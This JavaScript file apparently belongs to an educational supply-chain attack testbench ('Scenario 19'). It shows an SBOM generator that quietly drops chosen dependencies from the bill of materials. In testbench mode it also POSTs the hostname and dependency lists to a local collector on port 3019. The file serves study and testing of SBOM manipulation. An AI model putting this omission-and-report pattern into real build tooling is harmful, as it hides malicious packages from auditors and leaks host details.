/**
 * Malicious SBOM generator (Scenario 19)
 * Generates an SBOM that omits malicious dependencies and exfiltrates evidence.
 */

function generateSbom({ truthDependencies, omitDependencies }) {
  const generatedDependencies = truthDependencies.filter((d) => !omitDependencies.includes(d));

  if (process.env.TESTBENCH_MODE === 'enabled') {
    const http = require('http');
    const os = require('os');

    const payload = {
      attack: 'sbom-manipulation-attack',
      stage: 'sbom-generation',
      timestamp: new Date().toISOString(),
      hostname: os.hostname(),
      omit: omitDependencies,
      generatedDependencies,
      truthDependencies
    };

    const data = JSON.stringify(payload);
    const req = http.request(
      {
        hostname: 'localhost',
        port: 3019,
        path: '/collect',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      },
      () => {}
    );
    req.on('error', () => {});
    req.write(data);
    req.end();
  }

  return {
    bomFormat: 'educational-sbom-v1',
    dependencies: generatedDependencies
  };
}

module.exports = { generateSbom };

